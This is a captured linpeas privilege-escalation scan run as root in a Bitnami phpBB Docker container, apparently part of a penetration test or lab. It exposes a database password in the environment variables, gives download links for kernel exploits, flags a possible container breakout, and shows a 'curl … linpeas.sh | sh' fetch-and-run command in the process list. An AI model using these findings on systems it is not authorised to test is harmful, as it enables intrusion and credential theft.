```
root@7546fa2336d6:/root# cat lin.out 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          linpeas-ng by github.com/PEASS-ng

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

  YOU ARE ALREADY ROOT!!! (it could take longer to complete execution)

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-142-generic (buildd@lgw01-amd64-036) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #146-Ubuntu SMP Tue Apr 13 01:11:19 UTC 2021
User & Groups: uid=0(root) gid=0(root) groups=0(root)
Hostname: 7546fa2336d6
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)



Caching directories DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-142-generic (buildd@lgw01-amd64-036) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #146-Ubuntu SMP Tue Apr 13 01:11:19 UTC 2021
lsb_release Not Found

╔══════════╣ Sudo version
sudo Not Found


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses

╔══════════╣ Date & uptime
Mon Aug 19 10:31:17 UTC 2024
 10:31:17 up  1:28,  0 users,  load average: 0.00, 0.01, 1.10

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices

╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
MYSQL_CLIENT_CREATE_DATABASE_USER=
APACHE_HTTPS_PORT_NUMBER=
HOSTNAME=7546fa2336d6
SHLVL=0
HOME=/
OLDPWD=/
APACHE_ENABLE_CUSTOM_PORTS=no
MYSQL_CLIENT_SSL_CA_FILE=
MARIADB_PORT_NUMBER=3306
MYSQL_CLIENT_CREATE_DATABASE_NAME=
OS_ARCH=amd64
BITNAMI_APP_NAME=phpbb
BITNAMI_IMAGE_VERSION=3.3.3-debian-10-r53
MYSQL_CLIENT_CREATE_DATABASE_PRIVILEGES=ALL
OS_NAME=linux
_=/bin/sh
TERM=xterm
PATH=/opt/bitnami/php/bin:/opt/bitnami/php/sbin:/opt/bitnami/apache/bin:/opt/bitnami/mysql/bin:/opt/bitnami/common/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MARIADB_ROOT_PASSWORD=
PHPBB_DATABASE_PASSWORD=P@ssword
HISTSIZE=0
ALLOW_EMPTY_PASSWORD=yes
MARIADB_ROOT_USER=root
PHPBB_DATABASE_USER=bn_phpbb
MYSQL_CLIENT_ENABLE_SSL=no
PWD=/root
MARIADB_HOST=mariadb
PHPBB_DATABASE_NAME=bitnami_phpbb
OS_FLAVOUR=debian-10
HISTFILE=/dev/null
APACHE_HTTP_PORT_NUMBER=
MYSQL_CLIENT_CREATE_DATABASE_PASSWORD=

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-27365] linux-iscsi

   Details: https://blog.grimm-co.com/2021/03/new-old-bugs-in-linux-kernel.html
   Exposure: less probable
   Tags: RHEL=8
   Download URL: https://codeload.github.com/grimm-co/NotQuite0DayFriday/zip/trunk
   Comments: CONFIG_SLAB_FREELIST_HARDENED must not be enabled

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. AppArmor Not Found
═╣ AppArmor profile? .............. docker-default (enforce)
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... enabled
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... docker
═╣ Any running containers? ........ No
╔══════════╣ Docker Container details
═╣ Am I inside Docker group ....... No
═╣ Looking and enumerating Docker Sockets (if any):
═╣ Docker version ................. Not Found
═╣ Vulnerable to CVE-2019-5736 .... Not Found
═╣ Vulnerable to CVE-2019-13139 ... Not Found
═╣ Rootless Docker? ............... No


╔══════════╣ Container & breakout enumeration
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
═╣ Container ID ................... 7546fa2336d6═╣ Container Full ID .............. 7546fa2336d6ff6152d8fdfcb86b65ba4ef8dddd5dd199df560fdc391406f94a
═╣ Seccomp enabled? ............... enabled
═╣ AppArmor profile? .............. docker-default (enforce)
═╣ User proc namespace? ........... enabled         0          0 4294967295
═╣ Vulnerable to CVE-2019-5021 .... No

══╣ Breakout via mounts
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts
═╣ /proc mounted? ................. No
═╣ /dev mounted? .................. No
═╣ Run unshare .................... No
═╣ release_agent breakout 1........ Yes
═╣ release_agent breakout 2........ No
═╣ core_pattern breakout .......... No
═╣ binfmt_misc breakout ........... No
═╣ uevent_helper breakout ......... No
═╣ is modprobe present ............ No
═╣ DoS via panic_on_oom ........... No
═╣ DoS via panic_sys_fs ........... No
═╣ DoS via sysreq_trigger_dos ..... No
═╣ /proc/config.gz readable ....... No
═╣ /proc/sched_debug readable ..... Yes
═╣ /proc/*/mountinfo readable ..... Yes
═╣ /sys/kernel/security present ... Yes
═╣ /sys/kernel/security writable .. No

══╣ Namespaces
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/namespaces
total 0
lrwxrwxrwx 1 root root 0 Aug 19 10:31 cgroup -> cgroup:[4026531835]
lrwxrwxrwx 1 root root 0 Aug 19 10:31 ipc -> ipc:[4026532303]
lrwxrwxrwx 1 root root 0 Aug 19 10:31 mnt -> mnt:[4026532301]
lrwxrwxrwx 1 root root 0 Aug 19 10:31 net -> net:[4026532306]
lrwxrwxrwx 1 root root 0 Aug 19 10:31 pid -> pid:[4026532304]
lrwxrwxrwx 1 root root 0 Aug 19 10:31 pid_for_children -> pid:[4026532304]
lrwxrwxrwx 1 root root 0 Aug 19 10:31 user -> user:[4026531837]
lrwxrwxrwx 1 root root 0 Aug 19 10:31 uts -> uts:[4026532302]

╔══════════╣ Container Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=

╔══════════╣ Privilege Mode
Privilege Mode is disabled

╔══════════╣ Interesting Files Mounted
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/TVNWEOK5TD4EEZO3S3JL6I24D4:/var/lib/docker/overlay2/l/7ELVD6UQZLOS3AQZMSTRFJSMJ3:/var/lib/docker/overlay2/l/F2UZULAJNTCSTA2CIMPGJGALZW:/var/lib/docker/overlay2/l/NFGTWWOYHJQUVPRU6TNP3ZNCAC:/var/lib/docker/overlay2/l/5Y6SRHOIWBO6MXE2OC5TYN4D2R:/var/lib/docker/overlay2/l/UX6QCYAMISGTKK3KJ6A32S6GMI:/var/lib/docker/overlay2/l/UUTBSKNFRDJJM3QCNZKWNVJRE4:/var/lib/docker/overlay2/l/ME7TNBVFCX4I4KMXBHWPIUNMQ4:/var/lib/docker/overlay2/l/CKATXQTY6XLNKW4R5W2QRU23BY:/var/lib/docker/overlay2/l/7WLR6HNVFVI7PCMMQJLOJA2QMC:/var/lib/docker/overlay2/l/6DU73WBP62M7N2HYY46YRN2CFS:/var/lib/docker/overlay2/l/OWCLCT52QW4YPKREU4TSZTVHDC:/var/lib/docker/overlay2/l/4RCGW3XST3MYDOBZGQUWBDHSBG:/var/lib/docker/overlay2/l/MTXC3ZGNWLTVL644BS2IXCGHG4:/var/lib/docker/overlay2/l/5E6FVFFNMXOHLFRVY2H4FJK36X:/var/lib/docker/overlay2/l/3CQRWJUTY2HX57S7E53WNLNYYS:/var/lib/docker/overlay2/l/AHPPI4EPGW42RHBAWZCAA63SOF:/var/lib/docker/overlay2/l/5VZNTAZCYR7ETBJCCLVJWICQMD,upperdir=/var/lib/docker/overlay2/7e0b8ac226fe33cb7fc89da143abe0afc48edaff94caea13fb9edfe03a347c48/diff,workdir=/var/lib/docker/overlay2/7e0b8ac226fe33cb7fc89da143abe0afc48edaff94caea13fb9edfe03a347c48/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
/dev/xvda1 on /opt/clean type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /bitnami/phpbb type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/xvda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)
proc on /proc/bus type proc (ro,relatime)
proc on /proc/fs type proc (ro,relatime)
proc on /proc/irq type proc (ro,relatime)
proc on /proc/sys type proc (ro,relatime)
proc on /proc/sysrq-trigger type proc (ro,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/sched_debug type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/scsi type tmpfs (ro,relatime)
tmpfs on /sys/firmware type tmpfs (ro,relatime)

╔══════════╣ Possible Entrypoints
-rwxrwxr-x 1 root root  796 Mar 24  2021 /post-init.sh
-rwxrwxr-x 1 root root  848 Mar 24  2021 /post-init.d/php.sh
-rwxrwxr-x 1 root root 1.1K Mar 24  2021 /post-init.d/shell.sh
-rwxrwxr-x 1 root root 1.4K Mar 24  2021 /post-init.d/sql-mysql.sh



                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM? ............................ No
═╣ Azure APP? ........................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root       506  0.0  0.3   4000  3296 pts/0    Ss   10:21   0:00 /bin/bash
root       607  0.0  0.9  23104  9344 pts/0    S+   10:31   0:00  _ curl -L http://10.8.1.99:8000/linpeas.sh
root       608  0.0  0.2   3388  2596 pts/0    S+   10:31   0:00  _ sh
root      3567  0.0  0.1   3388  1208 pts/0    S+   10:33   0:00      _ sh
root      3571  0.0  0.2   7640  2640 pts/0    R+   10:33   0:00      |   _ ps fauxwww
root      3570  0.0  0.1   3388  1208 pts/0    S+   10:33   0:00      _ sh
1001         1  0.0  3.8 296492 38884 ?        Ss   09:03   0:04 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       370  0.1  3.8 297596 39096 ?        S    09:47   0:03 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       417  0.0  3.7 297076 37308 ?        S    09:49   0:02 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       426  0.0  4.0 297612 41016 ?        S    09:49   0:02 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       429  0.0  3.7 297488 38168 ?        S    09:49   0:02 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       447  0.0  3.7 296928 37372 ?        S    09:49   0:02 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       477  0.0  3.6 296928 36492 ?        S    09:49   0:01 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       478  0.0  3.6 296928 36552 ?        S    09:49   0:01 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       495  0.0  3.6 296928 36548 ?        S    09:51   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       498  0.0  3.7 296928 37308 ?        S    09:51   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND
1001       504  0.0  3.6 296928 36548 ?        S    09:52   0:00 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
crontab Not Found
incrontab Not Found
/etc/cron.daily:
total 24
drwxr-xr-x 2 root root 4096 Feb 18  2021 .
drwxr-xr-x 1 root root 4096 Apr  9  2021 ..
-rwxr-xr-x 1 root root 1478 Dec  7  2020 apt-compat
-rwxr-xr-x 1 root root 1187 Apr 19  2019 dpkg
-rwxr-xr-x 1 root root  249 Sep 27  2017 passwd

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
busctl Not Found


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
7546fa2336d6
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.18.0.3	7546fa2336d6
nameserver 127.0.0.11
options ndots:0

╔══════════╣ Interfaces
Inter-|   Receive                                                |  Transmit
 face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed
  eth0: 175961736  419381    0    0    0     0          0         0 237655603  475333    0    0    0     0       0          0
    lo: 4003702   67741    0    0    0     0          0         0  4003702   67741    0    0    0     0       0          0
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/30 2 0 2
           |-- 172.18.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.18.0.3
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/30 2 0 2
           |-- 172.18.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.18.0.3
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports

╔══════════╣ Can I sniff with tcpdump?
No



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=0(root) gid=0(root) groups=0(root)

╔══════════╣ Do I have PGP keys?
gpg Not Found
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 10:33:42 up  1:31,  0 users,  load average: 0.00, 0.01, 0.94
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons

╔══════════╣ Last time logon each user

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/perl
/opt/bitnami/php/bin/php
/bin/ping

╔══════════╣ Installed Compilers

╔══════════╣ MySQL version
mysql  Ver 15.1 Distrib 10.3.28-MariaDB, for Linux (x86_64) using readline 5.1


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No


╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: apache2 Not Found
Server version: Apache/2.4.46 (Unix)
Server built:   Dec 21 2020 12:49:53
Nginx version: nginx Not Found

══╣ PHP exec extensions


-rw-rw-r-- 1 root root 72075 Mar 24  2021 /opt/bitnami/php/etc/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
lrwxrwxrwx 1 root root 14 Mar 17  2021 /opt/bitnami/php/lib/php.ini -> ../etc/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Http conf Files (limit 70)
-rw-rw-r-- 1 root root 19248 Mar 24  2021 /opt/bitnami/apache/conf/httpd.conf
-rw-rw-r-- 1 root root 18757 Dec 21  2020 /opt/bitnami/apache/conf/original/httpd.conf

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Mar 24  2021 /etc/ldap


╔══════════╣ Searching ssl/ssh files

══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml

══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
